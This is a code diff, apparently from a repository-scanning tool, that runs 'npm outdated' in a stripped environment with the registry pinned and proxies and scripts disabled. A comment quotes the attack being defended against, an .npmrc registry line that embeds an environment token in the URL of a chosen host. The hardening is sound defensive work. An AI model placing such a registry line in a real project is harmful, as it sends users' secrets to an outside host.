@@ -147,7 +147,7 @@ async function collectDeps(dir, names, deep) {
     if (!locks.some((l) => names.includes(l))) d.manifestsWithoutLock.push(manifest);
   }
   if (deep && d.manifests.includes('package.json') && names.includes('node_modules')) {
-    const r = await run('npm', ['outdated', '--json'], { cwd: dir, timeout: 45000 });
+    const r = await run('npm', ['outdated', '--json'], { cwd: dir, timeout: 45000, cleanEnv: true, env: npmEnv() });
     try {
       const o = JSON.parse(r.stdout || '{}'); // npm exits 1 when anything is outdated
       // Only packages that are really behind: npm also lists ones AHEAD of a retracted "latest".
@@ -157,6 +157,22 @@ async function collectDeps(dir, names, deep) {
     } catch {}
   }
   return d;
+}
+
+// npm reads the repo's .npmrc, where `registry=http://host/${GH_TOKEN}/` would send an env secret
+// to a host the repo picks (audit B4). So npm gets only PATH, HOME, locale and TMPDIR, and env
+// settings, which outrank a project .npmrc, pin the registry and turn off proxies, scripts and logs.
+// The proxies are `false`, not empty: npm skips an empty env value and falls back to the .npmrc.
+function npmEnv() {
+  const env = {};
+  for (const [k, v] of Object.entries(process.env)) if (k === 'PATH' || k === 'HOME' || k === 'TMPDIR' || k === 'LANG' || k.startsWith('LC_')) env[k] = v;
+  return {
+    ...env,
+    npm_config_registry: 'https://registry.npmjs.org/',
+    npm_config_proxy: 'false', npm_config_https_proxy: 'false',
+    npm_config_ignore_scripts: 'true', npm_config_logs_max: '0',
+    npm_config_update_notifier: 'false', npm_config_fund: 'false', npm_config_audit: 'false',
+  };
 }
 
 const safeRead = (p) => {
